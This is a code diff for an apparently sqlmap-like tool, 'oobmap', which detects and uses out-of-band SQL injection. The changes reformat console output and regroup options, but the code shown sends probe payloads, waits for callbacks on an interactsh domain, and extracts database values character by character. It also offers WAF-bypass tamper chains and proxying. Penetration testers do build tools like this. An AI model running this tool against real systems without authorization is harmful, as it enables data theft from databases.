@@ -19,6 +19,16 @@ from .tamper import TAMPERS, apply_tampers
 
 
 DEFAULT_ALPHABET = string.ascii_lowercase + string.digits
+
+
+def _hi(text: str) -> str:
+    if sys.stdout.isatty():
+        return f"\033[1;92m{text}\033[0m"
+    return text
+
+
+def _sep() -> None:
+    print("  " + "─" * 56)
 ENUM_ALPHABET = string.ascii_letters + string.digits + " _-.:/@()[]{}+,;=<>|"
 
 
@@ -115,31 +125,31 @@ def extract_char_binary(args, profile, request, domain, log, run_id, expression,
 
 
 def run_check(args, profile, request, domain, log, run_id) -> int:
-    print(f"[+] profile: {profile.name}")
-    print(f"[+] {profile.comment}")
-    print(f"[+] run id: {run_id}")
-    print(f"[+] watching: {', '.join(args.log)}")
-    print(f"[+] target: {args.place}:{args.param}")
+    _sep()
+    print(f"  profile   {profile.name}  |  run {run_id}")
+    print(f"  [~] {profile.comment}")
+    print(f"  target    {args.place}:{args.param}")
+    print(f"  watching  {', '.join(args.log)}")
+    _sep()
 
     true_token = f"{run_id}-true"
     false_token = f"{run_id}-false"
     true_payload = profile.payload(args.base, args.true_condition, f"{true_token}.{domain}")
     false_payload = profile.payload(args.base, args.false_condition, f"{false_token}.{domain}")
 
-    print("[+] sending true probe")
+    print("[+] sending true probe …")
     send_payload(args, request, true_payload)
     true_hit = log.wait_any({true_token: "true"}, args.timeout)
 
-    print("[+] sending false probe")
+    print("[+] sending false probe …")
     send_payload(args, request, false_payload)
     false_hit = log.wait_any({false_token: "false"}, args.timeout)
 
     if true_hit and not false_hit:
-        print("[+] OOB condition confirmed")
+        print(_hi("[+] OOB condition confirmed ✓"))
         return 0
     if true_hit and false_hit:
-        print("[!] both true and false probes triggered callbacks")
-        print("[!] payload is OOB-capable but not conditionally controlled")
+        print("[!] both true and false probes triggered — OOB capable but not conditional")
         return 2
     print("[!] no reliable conditional OOB behavior detected")
     return 1
@@ -185,7 +195,7 @@ def check(args) -> int:
         status = "confirmed" if rc == 0 else "conditional-failed" if rc == 2 else "not-confirmed"
         session.save_check(session.check_id(args.dbms, point.place, point.name), args.dbms, point.place, point.name, status)
         if rc == 0:
-            print(f"[+] injectable OOB point: --place {point.place} -p {point.name}")
+            print(_hi(f"[+] injectable OOB point: --place {point.place} -p {point.name}"))
             found = True
             if args.first:
                 break
@@ -232,9 +242,9 @@ def _extract_value_parallel(args, profile, request, domain, log, run_id, session
             extraction_id, args.dbms, args.place, args.param,
             expression, alphabet, result, False,
         )
-        print(f"[+] pos {pos:02d}: {char} -> {result}", flush=True)
+        print(f"[>] pos {pos:02d}: {char}  {result}", flush=True)
 
-    print(f"[+] done: {result}")
+    print(f"\n[+] done  {_hi(result)}")
     session.save_extraction(
         extraction_id, args.dbms, args.place, args.param,
         expression, alphabet, result, True,
@@ -250,7 +260,7 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
     start_pos = 1
 
     if cached and cached["completed"]:
-        print(f"[+] resumed completed value from session: {cached['value']}")
+        print(f"[+] resumed from session  {_hi(cached['value'])}")
         session.close()
         return cached["value"]
 
@@ -259,13 +269,15 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
         start_pos = len(result) + 1
         print(f"[+] resuming from session at position {start_pos}: {result}")
 
-    print(f"[+] profile: {profile.name}")
-    print(f"[+] {profile.comment}")
-    print(f"[+] run id: {run_id}")
-    print(f"[+] expression: {expression}")
-    print(f"[+] domain: {domain}")
-    print(f"[+] watching: {', '.join(args.log)}")
-    print(f"[+] session: {session.path}")
+    _sep()
+    print(f"  profile   {profile.name}  |  run {run_id}")
+    print(f"  [~] {profile.comment}")
+    print(f"  expr      {expression}")
+    print(f"  domain    {domain}")
+    print(f"  watching  {', '.join(args.log)}")
+    print(f"  session   {session.path}")
+    _sep()
+    print()
 
     if getattr(args, "threads", 1) > 1:
         result = _extract_value_parallel(
@@ -290,16 +302,16 @@ def extract_value(args, expression: str, alphabet: str, max_len: int) -> str:
             char = token_map[token] if token else None
 
         if not char:
-            print(f"[+] done: {result}")
+            print(f"\n[+] done  {_hi(result)}")
             session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, True)
             session.close()
             return result
 
         result += char
         session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
-        print(f"[+] pos {pos:02d}: {char} -> {result}", flush=True)
+        print(f"[>] pos {pos:02d}: {char}  {result}", flush=True)
 
-    print(f"[!] reached max length: {result}")
+    print(f"\n[!] reached max length  {_hi(result)}")
     session.save_extraction(extraction_id, args.dbms, args.place, args.param, expression, alphabet, result, False)
     session.close()
     return result
@@ -555,64 +567,77 @@ def require_param(args):
 
 
 def add_common(parser):
-    parser.add_argument("-r", "--request", required=True, help="raw HTTP request file")
-    parser.add_argument("-p", "--param", help="parameter/cookie/header name to inject")
-    parser.add_argument(
+    tgt = parser.add_argument_group("target")
+    tgt.add_argument("-r", "--request", required=True, help="raw HTTP request file")
+    tgt.add_argument("-p", "--param", help="parameter/cookie/header name to inject")
+    tgt.add_argument(
         "--place",
         choices=["auto", "cookie", "query", "body", "header", "marker", "json"],
         default="auto",
-        help="where to inject, or marker to replace the first '*'",
+        help="injection place (default: auto); 'json' targets a dotted JSONPath e.g. user.name",
     )
-    parser.add_argument(
+    tgt.add_argument(
         "--dbms",
         choices=sorted(PROFILES),
         required=True,
-        help="OOB payload profile",
+        help="OOB payload profile — run 'oobmap profiles' for descriptions",
     )
-    parser.add_argument("--domain", required=True, help="interactsh domain")
-    parser.add_argument(
+    tgt.add_argument("-D", "--database", help="database/schema/catalog for metadata and dump queries")
+
+    oob = parser.add_argument_group("OOB callback")
+    oob.add_argument("--domain", required=True, help="interactsh collaborator domain")
+    oob.add_argument(
         "--log",
         action="append",
         required=True,
         metavar="PATH",
-        help="interactsh JSONL log path (repeatable for multiple sources)",
+        help="interactsh JSONL log file (repeat for multiple sources: --log a.jsonl --log b.jsonl)",
     )
-    parser.add_argument("--base", help="base/original value before the payload; defaults to the current target value")
-    parser.add_argument("--force-ssl", action="store_true", help="send request over HTTPS")
-    parser.add_argument("--http-timeout", type=float, default=10.0, help="HTTP response timeout in seconds (default: 10.0)")
-    parser.add_argument("--timeout", type=float, default=8.0, help="callback wait time per probe/position")
-    parser.add_argument("--run-id", help="fixed run id for reproducible debugging")
-    parser.add_argument("--level", type=int, choices=range(1, 6), default=1, help="scan depth for check without -p: 1=query/body, 2=cookies, 3=common headers, 5=all headers")
-    parser.add_argument("--risk", type=int, choices=(1, 2, 3), default=1, help="accepted for sqlmap-like workflow; payload selection is profile-driven for now")
-    parser.add_argument("--batch", action="store_true", help="accepted for sqlmap-like non-interactive workflows")
-    parser.add_argument("--output-dir", help="session/output directory (default: ~/.local/share/oobmap/output)")
-    parser.add_argument("--flush-session", action="store_true", help="delete the target session before running")
-    parser.add_argument("--fresh-queries", action="store_true", help="ignore cached extraction results but keep the session")
-    parser.add_argument("-D", "--database", help="database/schema/catalog to use for metadata and dump queries")
-    parser.add_argument(
+    oob.add_argument("--timeout", type=float, default=8.0, help="seconds to wait for a callback per probe/position (default: 8)")
+
+    net = parser.add_argument_group("network")
+    net.add_argument("--force-ssl", action="store_true", help="send request over HTTPS")
+    net.add_argument("--http-timeout", type=float, default=10.0, help="HTTP response timeout in seconds (default: 10)")
+    net.add_argument("--proxy", metavar="URL", help="proxy URL — http://host:port (SOCKS5 requires PySocks)")
+    net.add_argument("--no-verify-ssl", action="store_true", help="skip TLS certificate verification")
+    net.add_argument("--base", help="original parameter value before injection (default: current value from request file)")
+
+    ext = parser.add_argument_group("extraction")
+    ext.add_argument(
         "--strategy",
         choices=["batch", "binary"],
         default="batch",
-        help="batch: send full alphabet per position (default); binary: bisection, ~10x fewer requests",
+        help="batch: one request per char per position (default); binary: bisection, ~10x fewer requests",
     )
-    parser.add_argument(
-        "--tamper",
-        default="",
-        metavar="NAMES",
-        help="comma-separated tamper scripts (run 'oobmap tampers' for list): inline-comments,randomize-case,...",
-    )
-    parser.add_argument("--proxy", metavar="URL",
-                        help="proxy URL: http://host:port (SOCKS5 requires PySocks)")
-    parser.add_argument("--no-verify-ssl", action="store_true",
-                        help="skip SSL certificate verification")
-    parser.add_argument(
+    ext.add_argument(
         "--threads",
         type=int,
         default=1,
         metavar="N",
-        help="parallel position extraction threads (default: 1; recommended: 2-4)",
+        help="extract N positions in parallel (default: 1; recommended range: 2-4)",
     )
-    parser.add_argument("-v", "--verbose", action="store_true", help="print HTTP status and payload details")
+
+    waf = parser.add_argument_group("WAF bypass")
+    waf.add_argument(
+        "--tamper",
+        default="",
+        metavar="NAMES",
+        help="comma-separated tamper chain — run 'oobmap tampers' for the list",
+    )
+
+    sess = parser.add_argument_group("session")
+    sess.add_argument("--output-dir", help="session/output directory (default: ~/.local/share/oobmap/output)")
+    sess.add_argument("--flush-session", action="store_true", help="delete the current target session before running")
+    sess.add_argument("--fresh-queries", action="store_true", help="ignore cached extraction results without deleting the session")
+    sess.add_argument("--run-id", help="fix run ID for reproducible token debugging")
+
+    misc = parser.add_argument_group("misc")
+    misc.add_argument("--level", type=int, choices=range(1, 6), default=1,
+                      help="auto-scan depth (no -p): 1=query+body, 2=+cookies, 3=+common headers, 5=all headers")
+    misc.add_argument("--risk", type=int, choices=(1, 2, 3), default=1,
+                      help="sqlmap-compatible flag (accepted but profile-driven; no effect currently)")
+    misc.add_argument("--batch", action="store_true", help="non-interactive mode (sqlmap compatibility)")
+    misc.add_argument("-v", "--verbose", action="store_true", help="print HTTP status and sent payload for each request")
 
 
 def make_parser():
